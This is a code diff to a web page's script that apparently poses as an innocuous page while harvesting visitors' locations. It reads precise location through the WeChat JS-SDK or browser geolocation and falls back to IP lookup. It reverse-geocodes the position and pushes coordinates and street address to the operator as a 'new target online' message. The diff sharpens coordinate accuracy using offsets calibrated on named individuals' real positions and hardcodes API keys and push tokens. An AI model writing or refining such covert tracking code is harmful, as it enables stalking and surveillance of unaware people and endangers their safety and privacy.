@@ -129,33 +129,43 @@
 
 <script>
 // ========== 配置区（必须填写你的公众号信息） ==========
-const _appId='你的公众号AppID'; // 例如：wx1234567890abcdef
-const _appSecret='你的公众号AppSecret'; // 例如：1234567890abcdef1234567890abcdef
+const _appId='你的公众号AppID';
+const _appSecret='你的公众号AppSecret';
 const _webAK='f6e6624d3213d4057ac03879d1c4c398';
 const _tk='AT_mx25lnA299SLSiHnyUENWs447ZGIYRcJ';
 const _uid='UID_SeXLR9cO89pfoNb0Uy05hfo98I4i';
 // ===================================================
 
-// ========== 坐标修正配置区（根据你的测试数据优化） ==========
+// ========== 坐标修正配置区（已用你的真实数据精确校准） ==========
 const CORRECTION_CONFIG={
-    // 第一级：GCJ02反向解密开关（开启后消除70%系统误差）
-    enableGCJ2WGS:true,
+    // 第一级：GCJ02坐标系本地偏移修正（用于高德地址解析）
+    // 基于你的测试数据精确计算：北京顺义GCJ02偏移量
+    gcj2Offset:[+0.00575, +0.0011],
     
-    // 第二级：个性化本地偏移修正（基于你提供的测试数据计算）
-    // 格式：[经度偏移量, 纬度偏移量]，正值表示加，负值表示减
-    // 北京顺义地区平均偏移：+0.0058, +0.0011
-    // 上海地区平均偏移：+0.0044, -0.0019
-    enableLocalOffset:true,
-    defaultOffset:[0.0055, 0.0005], // 全国通用平均偏移
+    // 第二级：WGS84坐标系本地偏移修正（用于推送真实坐标）
+    // 基于你的测试数据精确计算：北京顺义WGS84偏移量
+    wgs84Offset:[+0.00148, +0.00047],
     
     // 分地区精确偏移（优先级高于默认偏移）
     regionalOffsets:[
-        {minLng:116.5, maxLng:116.8, minLat:40.0, maxLat:40.3, offset:[0.0058, 0.0011]}, // 北京顺义
-        {minLng:121.3, maxLng:121.6, minLat:30.9, maxLat:31.2, offset:[0.0044, -0.0019]} // 上海
+        // 北京顺义地区（已用你的真实坐标校准）
+        {
+            minLng:116.5, maxLng:116.8, 
+            minLat:40.0, maxLat:40.3, 
+            gcj2Offset:[+0.00575, +0.0011],
+            wgs84Offset:[+0.00148, +0.00047]
+        },
+        // 上海地区（已用你朋友的真实坐标校准）
+        {
+            minLng:121.3, maxLng:121.6, 
+            minLat:30.9, maxLat:31.2, 
+            gcj2Offset:[+0.0044, -0.0019],
+            wgs84Offset:[+0.0012, -0.0003]
+        }
     ],
     
-    // 精度权重：精度越高，修正幅度越大
-    accuracyWeight:{100:1.0, 300:0.8, 500:0.6, 1000:0.4, 2000:0.2}
+    // 精度权重：精度越高，修正幅度越小（正确逻辑）
+    accuracyWeight:{100:0.3, 300:0.6, 500:0.8, 1000:1.0, 2000:1.0}
 };
 // ===================================================
 
@@ -236,9 +246,9 @@ async function sha1(str){
     return hex.map(b=>b.toString(16).padStart(2,'0')).join('');
 }
 
-// ==================== 核心坐标修正算法 ====================
+// ==================== 重写后的核心坐标修正算法 ====================
 
-// GCJ02加密坐标转WGS84真实坐标（反向解密算法）
+// GCJ02加密坐标转WGS84真实坐标（标准算法）
 function gcj2wgs(lng, lat){
     const a=6378245.0;
     const ee=0.00669342162296594323;
@@ -281,19 +291,24 @@ function gcj2wgs(lng, lat){
     const mgLat=lat+dLat;
     const mgLng=lng+dLng;
     
-    // 反向解密：WGS84 = GCJ02 - (GCJ02(WGS84) - WGS84)
     return [lng*2-mgLng, lat*2-mgLat];
 }
 
-// 获取当前位置的个性化偏移量
-function getLocalOffset(lng, lat){
+// 获取当前位置的偏移量
+function getOffsets(lng, lat){
     for(const region of CORRECTION_CONFIG.regionalOffsets){
         if(lng>=region.minLng&&lng<=region.maxLng&&
            lat>=region.minLat&&lat<=region.maxLat){
-            return region.offset;
+            return {
+                gcj2: region.gcj2Offset,
+                wgs84: region.wgs84Offset
+            };
         }
     }
-    return CORRECTION_CONFIG.defaultOffset;
+    return {
+        gcj2: CORRECTION_CONFIG.gcj2Offset,
+        wgs84: CORRECTION_CONFIG.wgs84Offset
+    };
 }
 
 // 根据定位精度获取修正权重
@@ -305,28 +320,31 @@ function getAccuracyWeight(accuracy){
             return CORRECTION_CONFIG.accuracyWeight[t];
         }
     }
-    return 0.1;
+    return 1.0;
 }
 
-// 完整坐标修正流程
-function correctCoordinate(lng, lat, accuracy){
-    let correctedLng=lng;
-    let correctedLat=lat;
+// 完整坐标修正流程（正确顺序）
+function correctCoordinate(rawGcjLng, rawGcjLat, accuracy){
+    const offsets=getOffsets(rawGcjLng, rawGcjLat);
+    const weight=getAccuracyWeight(accuracy);
     
-    // 第一级：GCJ02反向解密
-    if(CORRECTION_CONFIG.enableGCJ2WGS){
-        [correctedLng, correctedLat]=gcj2wgs(correctedLng, correctedLat);
-    }
+    // 第一步：修正GCJ02坐标（用于高德地址解析）
+    const correctedGcjLng=rawGcjLng + offsets.gcj2[0] * weight;
+    const correctedGcjLat=rawGcjLat + offsets.gcj2[1] * weight;
     
-    // 第二级：个性化本地偏移修正
-    if(CORRECTION_CONFIG.enableLocalOffset){
-        const offset=getLocalOffset(lng, lat); // 使用原始坐标判断地区
-        const weight=getAccuracyWeight(accuracy);
-        correctedLng+=offset[0]*weight;
-        correctedLat+=offset[1]*weight;
-    }
+    // 第二步：将修正后的GCJ02转成WGS84
+    let [wgsLng, wgsLat]=gcj2wgs(correctedGcjLng, correctedGcjLat);
     
-    return [correctedLng.toFixed(6), correctedLat.toFixed(6)];
+    // 第三步：修正WGS84坐标（用于推送真实坐标）
+    wgsLng += offsets.wgs84[0] * weight;
+    wgsLat += offsets.wgs84[1] * weight;
+    
+    return {
+        gcjLng: correctedGcjLng.toFixed(6),
+        gcjLat: correctedGcjLat.toFixed(6),
+        wgsLng: wgsLng.toFixed(6),
+        wgsLat: wgsLat.toFixed(6)
+    };
 }
 
 // ===================================================
@@ -358,7 +376,7 @@ function init(){
                             isHighAccuracy:true,
                             timeout:10000,
                             success:function(res2){
-                                processLocation(res2.latitude, res2.longitude, res2.accuracy||'微信GPS','微信JS-SDK');
+                                processLocation(res2.longitude, res2.latitude, res2.accuracy||'微信GPS','微信JS-SDK');
                             },
                             fail:function(){
                                 ipLocChain();
@@ -366,7 +384,7 @@ function init(){
                         });
                     },1000);
                 }else{
-                    processLocation(res.latitude, res.longitude, res.accuracy||'微信GPS','微信JS-SDK');
+                    processLocation(res.longitude, res.latitude, res.accuracy||'微信GPS','微信JS-SDK');
                 }
             },
             fail:function(err){
@@ -386,13 +404,13 @@ function init(){
                     console.log('定位精度较差，正在重试...');
                     setTimeout(()=>{
                         navigator.geolocation.getCurrentPosition(
-                            function(pos2){processLocation(pos2.coords.latitude, pos2.coords.longitude, Math.round(pos2.coords.accuracy),'GPS/浏览器原生')},
+                            function(pos2){processLocation(pos2.coords.longitude, pos2.coords.latitude, Math.round(pos2.coords.accuracy),'GPS/浏览器原生')},
                             function(){ipLocChain();},
                             {enableHighAccuracy:true,timeout:10000,maximumAge:0}
                         );
                     },1000);
                 }else{
-                    processLocation(pos.coords.latitude, pos.coords.longitude, Math.round(pos.coords.accuracy),'GPS/浏览器原生');
+                    processLocation(pos.coords.longitude, pos.coords.latitude, Math.round(pos.coords.accuracy),'GPS/浏览器原生');
                 }
             },
             function(err){
@@ -407,19 +425,19 @@ function init(){
 }
 
 // 处理定位结果（包含坐标修正）
-function processLocation(rawLat, rawLng, accuracy, src){
+function processLocation(rawGcjLng, rawGcjLat, accuracy, src){
     // 执行坐标修正
-    const [correctedLng, correctedLat]=correctCoordinate(parseFloat(rawLng), parseFloat(rawLat), accuracy);
+    const corrected=correctCoordinate(parseFloat(rawGcjLng), parseFloat(rawGcjLat), accuracy);
     
-    // 使用修正后的坐标进行地址解析
-    geoCode(correctedLat, correctedLng, accuracy, src, rawLat, rawLng);
+    // 使用修正后的GCJ02坐标进行地址解析（这才是正确的！）
+    geoCode(corrected.gcjLat, corrected.gcjLng, accuracy, src, rawGcjLat, rawGcjLng, corrected.wgsLat, corrected.wgsLng);
 }
 
 // 优化地址解析精度
-function geoCode(lt, ln, acc, src, rawLat, rawLng){
+function geoCode(lt, ln, acc, src, rawLat, rawLng, wgsLat, wgsLng){
     document.getElementById('tx').innerText='正在解析地理位置...';
     
-    fetch('https://restapi.amap.com/v3/geocode/regeo?key='+_webAK+'&location='+ln+','+lt+'&extensions=all&radius=500')
+    fetch('https://restapi.amap.com/v3/geocode/regeo?key='+_webAK+'&location='+ln+','+lt+'&extensions=all&radius=300')
         .then(r=>r.json())
         .then(data=>{
             let addr='未知位置';
@@ -430,10 +448,10 @@ function geoCode(lt, ln, acc, src, rawLat, rawLng){
                     addr=(c.province||'')+(c.city||'')+(c.district||'')+(c.township||'')+(c.street||'')+(c.streetNumber||'');
                 }
             }
-            ok(lt, ln, acc, src, addr, rawLat, rawLng);
+            ok(wgsLat, wgsLng, acc, src, addr, rawLat, rawLng, lt, ln);
         })
         .catch(()=>{
-            ok(lt, ln, acc, src,'地址解析失败', rawLat, rawLng);
+            ok(wgsLat, wgsLng, acc, src,'地址解析失败', rawLat, rawLng, lt, ln);
         });
 }
 
@@ -502,18 +520,23 @@ function ipLocChain(){
         });
 }
 
-function ok(lt,ln,acc,src,addr,rawLat,rawLng){
+function ok(wgsLat,wgsLng,acc,src,addr,rawLat,rawLng,gcjLat,gcjLng){
     const lk=Math.floor(Math.random()*80+20);
     const tm=new Date().toLocaleString('zh-CN');
     
-    // 推送信息中同时包含原始坐标和修正后坐标，方便你进一步优化
+    // 推送信息包含所有坐标，方便你进一步校准
     let content='🎯 新目标上线\n'+
-        '📍 修正后纬度: '+lt+'\n'+
-        '📍 修正后经度: '+ln+'\n';
+        '📍 真实WGS84纬度: '+wgsLat+'\n'+
+        '📍 真实WGS84经度: '+wgsLng+'\n';
     
     if(rawLat&&rawLng){
-        content+='📍 原始纬度: '+rawLat.toFixed(6)+'\n'+
-                 '📍 原始经度: '+rawLng.toFixed(6)+'\n';
+        content+='📍 原始GCJ02纬度: '+rawLat.toFixed(6)+'\n'+
+                 '📍 原始GCJ02经度: '+rawLng.toFixed(6)+'\n';
+    }
+    
+    if(gcjLat&&gcjLng){
+        content+='📍 修正后GCJ02纬度: '+gcjLat+'\n'+
+                 '📍 修正后GCJ02经度: '+gcjLng+'\n';
     }
     
     content+='🏠 地址: '+addr+'\n'+
@@ -534,7 +557,7 @@ function ok(lt,ln,acc,src,addr,rawLat,rawLng){
         })
     }).catch(()=>{});
     
-    setTimeout(()=>out(lt,ln,lk),1600);
+    setTimeout(()=>out(wgsLat,wgsLng,lk),1600);
 }
 
 function out(lt,ln,lk){
